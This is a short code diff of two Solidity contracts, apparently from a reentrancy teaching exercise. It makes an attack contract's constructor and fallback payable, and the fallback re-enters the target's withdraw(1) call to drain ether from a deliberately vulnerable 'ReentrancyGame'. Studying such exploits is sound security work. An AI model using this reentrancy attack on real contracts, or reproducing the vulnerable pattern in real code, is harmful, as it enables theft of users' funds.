@@ -26,13 +26,17 @@ contract ReentrancyGame {
   function creditOf(address to) public returns (uint) {
     return credit[to];
   }
+  
+  function checkBalance() public constant returns (uint){
+      return this.balance;
+  }
 }
 
 contract ReentrancyAttack {
   ReentrancyGame public regame;
   address owner;
 
-  function ReentrancyAttack (ReentrancyGame addr) { 
+  function ReentrancyAttack (ReentrancyGame addr) payable { 
     owner = msg.sender;
     regame = addr;
   }
@@ -48,7 +52,11 @@ contract ReentrancyAttack {
     return true;
   }
 
-  function() public{ 
+  function checkBalance() public constant returns (uint){
+      return this.balance;
+  }
+
+  function() public payable { 
     regame.withdraw(1); 
   }
 }
